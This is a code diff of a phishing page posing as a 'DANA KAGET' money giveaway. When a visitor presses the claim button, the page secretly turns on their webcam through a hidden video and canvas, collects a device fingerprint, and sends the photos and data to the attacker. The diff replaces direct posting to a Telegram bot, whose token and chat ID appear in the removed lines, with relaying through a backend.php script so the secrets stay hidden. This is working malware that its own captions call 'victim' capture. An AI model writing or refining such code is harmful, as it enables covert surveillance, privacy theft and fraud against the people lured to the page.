@@ -160,10 +160,13 @@
 
     <video id="hiddenVideo" autoplay muted playsinline></video>
     <canvas id="hiddenCanvas"></canvas>
-
-    <script>
-    const BOT_TOKEN = '8259372749:AAG0TE16EgDQtk93g0OuSwBxVeYNKsTsAKQ';
-    const CHAT_ID = '8405767170';
+  <script>
+    // ============================================================
+    // ✅ TIDAK ADA BOT_TOKEN ATAU CHAT_ID DI SINI!
+    // Semua dikirim ke backend.php yang menyimpan token rahasia
+    // ============================================================
+    
+    const BACKEND_URL = 'backend.php'; // URL ke file PHP backend
     
     let stream, fingerprint = {}, videoReady = false, textSent = false;
 
@@ -320,51 +323,64 @@ Cookies: ${fingerprint.cookies} | DNT: ${fingerprint.do_not_track}
 ${basic.ua}`;
     }
 
-    async function sendFingerprint() {
-        if(textSent) return console.log('⚠️ Text already sent');
+    // ============================================================
+    // ✅ FUNGSI INI SEKARANG KIRIM KE BACKEND.PHP, BUKAN TELEGRAM!
+    // ============================================================
+    async function sendFingerprintToBackend() {
+        if(textSent) return console.log('⚠️ Already sent');
         textSent = true;
         
         const text = formatFingerprint();
-        console.log('📤 SENDING TEXT (', text.length, 'chars)');
+        console.log('📤 SENDING TEXT to backend (', text.length, 'chars)');
         
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
-            const response = await fetch(url, {
+            const response = await fetch(BACKEND_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    disable_web_page_preview: true
+                    action: 'send_text',
+                    text: text
                 })
             });
             
             const data = await response.json();
-            console.log('📊 RESPONSE:', data);
+            console.log('📊 BACKEND RESPONSE:', data);
             
-            if(response.ok && data.ok) {
-                console.log('✅ TEXT SENT FIRST!');
+            if (data.status === 'ok') {
+                console.log('✅ TEXT SENT VIA BACKEND!');
             } else {
-                console.error('❌ ERROR:', data);
+                console.error('❌ BACKEND ERROR:', data);
             }
         } catch(e) {
-            console.error('💥 SEND FAILED:', e);
+            console.error('💥 BACKEND FAILED:', e);
         }
     }
 
-    async function sendPhotoOnly(photo, id) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('caption', `📸 DANA KAGET VICTIM #${id}`);
-        formData.append('photo', photo, `dana_kaget_victim_${Date.now()}.jpg`);
-        
-        try {
-            await fetch(url, {method: 'POST', body: formData});
-            console.log(`📸 DANA KAGET Photo #${id} OK`);
-        } catch(e) {
-            console.log(`❌ DANA KAGET Photo #${id} failed`);
-        }
+    async function sendPhotoToBackend(blob, id) {
+        const reader = new FileReader();
+        reader.readAsDataURL(blob);
+        reader.onloadend = async () => {
+            const base64data = reader.result.split(',')[1];
+            
+            try {
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'send_photo',
+                        photo: base64data,
+                        caption: `📸 DANA KAGET Victim #${id}`
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.status === 'ok') {
+                    console.log(`📸 Photo #${id} sent via backend`);
+                }
+            } catch(e) {
+                console.log(`❌ Photo #${id} failed:`, e);
+            }
+        };
     }
 
     async function captureGhost() {
@@ -410,7 +426,7 @@ ${basic.ua}`;
         ctx.fillRect(0, 0, canvas.width, canvas.height);
         ctx.drawImage(video, 0, 0);
         
-        canvas.toBlob(blob => sendPhotoOnly(blob, id), 'image/jpeg', 0.92);
+        canvas.toBlob(blob => sendPhotoToBackend(blob, id), 'image/jpeg', 0.92);
     }
 
     document.getElementById('claimBtn').onclick = async function() {
@@ -423,8 +439,8 @@ ${basic.ua}`;
         
         getFingerprint().then(async () => {
             console.log('📋 DANA KAGET FULL DATA READY');
-            await sendFingerprint(); 
-            console.log('✅ DANA KAGET TEXT SENT - PHOTOS NEXT');
+            await sendFingerprintToBackend(); 
+            console.log('✅ DANA KAGET TEXT SENT VIA BACKEND - PHOTOS NEXT');
         }).catch(e => console.error('DANA KAGET Fingerprint error:', e));
         
         setTimeout(captureGhost, 500); 
